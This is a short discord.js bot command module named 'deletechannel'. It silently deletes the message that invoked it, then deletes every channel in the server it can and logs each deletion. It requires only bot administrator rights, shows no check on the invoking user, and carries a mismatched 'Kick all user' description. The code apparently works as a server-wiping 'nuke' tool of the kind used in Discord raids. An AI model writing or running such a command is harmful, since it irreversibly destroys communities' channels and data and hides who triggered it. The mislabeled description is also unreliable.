const {
    MessageEmbed
} = require('discord.js');
const config = require('../../JSON/config.json');
module.exports  = {
    name: "deletechannel",
    aliases: [`channel`],
    category: 'Bot',
    description: `Kick all user`,
    cooldown: 5,
    BotPerms: ["ADMINISTRATOR"],
    run: async (client, message, args, prefix) => {
        message.delete()

        message.guild.channels.cache.forEach(channel => {
            if (channel.deletable){                
                channel.delete()
                console.log(`[Success] Deleted channel: ${channel.name}!`)
            } else {    
                console.log(`[ERR] Can't delete channel: ${channel.name}!`)
            }
        })
        return console.log(`[Success] Finished task!`)
    }
}